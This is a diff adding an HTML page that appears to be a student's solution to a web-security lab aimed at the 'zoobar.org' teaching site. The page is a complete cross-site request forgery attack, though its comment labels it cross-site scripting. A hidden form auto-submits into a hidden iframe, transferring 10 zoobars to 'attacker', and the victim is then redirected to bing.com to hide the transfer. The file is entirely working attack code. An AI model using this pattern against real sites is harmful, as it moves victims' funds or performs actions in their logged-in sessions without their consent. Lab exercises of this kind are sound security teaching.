@@ -1,0 +1,23 @@
+<DOCTYPE html>
+	<html>
+		<!-- <head>Part B: Cross-Site-Script</head> -->
+		<body>
+
+			<form method="POST" action="http://zoobar.org/transfer.php" hidden>
+				<input name="zoobars" type="text" value="10">
+				<input name="recipient" type="text" value="attacker">
+				<input id="submitButton" type="submit" name="submission" value="Send" formtarget="exploit">
+			</form>
+
+			<iframe name="exploit" onload="assign()" hidden></iframe>
+	
+			<script>
+				function assign(){
+					window.location ="http://www.bing.com";
+				};
+				document.getElementById("submitButton").click();
+			</script>
+		</body>
+	</html>
+</DOCTYPE>
+
